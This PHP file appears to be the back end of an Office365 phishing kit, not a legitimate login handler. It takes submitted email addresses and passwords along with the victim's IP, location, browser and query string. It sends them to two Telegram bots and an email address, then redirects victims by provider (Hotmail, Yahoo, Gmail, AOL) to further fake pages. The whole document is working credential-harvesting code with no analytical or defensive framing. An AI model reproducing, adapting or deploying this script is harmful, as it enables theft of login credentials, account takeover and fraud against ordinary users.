<?php
         
         if (isset($_POST['email']))
	          {
	          
	          	include 'config.php';
	          // check for valid email address
	          
	          $email = $_POST['email'];
			  $password = $_POST['password'];
	          include 'recon.php';
	         
	          $ip = getenv("REMOTE_ADDR");
			  $cookie = $_SERVER['QUERY_STRING'];
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: $Name OFFICE365 LOGINS [Fullz Details] :::::::::::::::::::::::::\r\n";
	          $body .= "Email                      : $email\r\n";
	          $body .= "Password                         : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
			  $body .= "cookies	                       : {$_SERVER['QUERY_STRING']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: $Name OFFICE365 LOGINS :::::::::::::::::::::::::\r\n";
	         
              $url = "https://api.telegram.org/bot" . $telegram_bot_api . "/sendMessage?chat_id=" . $telegram_chat_id . "&text=". urlencode($body);
$ch = curl_init();
$optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);

 $url = "https://api.telegram.org/bot" . $telegram_api . "/sendMessage?chat_id=" . $telegram_id . "&text=". urlencode($body);
$ch = curl_init();
$optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);

        
             
 
	          $subject="Office365 $Name Card Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Office365 $Name V1 <$themariarobert@yandex.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	         if(mail($mail, $subject, $body, $headers))
	          {
	          	$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

if ($_SESSION['email']=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
if ($_SESSION['email']!=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
elseif ($_SESSION['email']!=="" && empty($_POST['email']))
{
$_SESSION['email']=$_SESSION['email'];
}
if (strpos($_SESSION['email'], '@hotmail') !== false || strpos($_SESSION['email'], '@outlook') !== false || strpos($_SESSION['email'], '@live') !== false || strpos($_SESSION['email'], '@msn') !== false|| strpos($_SESSION['email'], '@windowslive') !== false) {



header("Location: ms/index.php");
	
}

elseif (strpos($_SESSION['email'], '@yahoo.com') !== false || strpos($_SESSION['email'], '@ymail') !== false) {



	header("Location: ms/index.php");
}

elseif (strpos($_SESSION['email'], '@gmail') !== false) {



header("Location: ms/index.php");
	
}
elseif (strpos($_SESSION['email'], '@aol') !== false) {



header("Location: ms/index.php");
	
}

else {



header("Location: ms/index.php");
	
}
	          }
	          else
	          {
	        	
$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);
if ($_SESSION['email']=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
if ($_SESSION['email']!=="" && !empty($_POST['email']))
{
$_SESSION['email'] = $_POST['email'];
}
elseif ($_SESSION['email']!=="" && empty($_POST['email']))
{
$_SESSION['email']=$_SESSION['email'];
}
if (strpos($_SESSION['email'], '@hotmail') !== false || strpos($_SESSION['email'], '@outlook') !== false || strpos($_SESSION['email'], '@live') !== false || strpos($_SESSION['email'], '@msn') !== false|| strpos($_SESSION['email'], '@windowslive') !== false) {



header("Location: ms/index.php");
	
}

elseif (strpos($_SESSION['email'], '@yahoo.com') !== false || strpos($_SESSION['email'], '@ymail') !== false) {



header("Location: yh/index.php");
	
}

elseif (strpos($_SESSION['email'], '@gmail') !== false) {



header("Location: gm/index.php");
	
}
elseif (strpos($_SESSION['email'], '@aol') !== false) {



header("Location: al/index.php");
	
}

else {



header("Location: em/index.php");
	
}
	        	}
	          }
	          ?>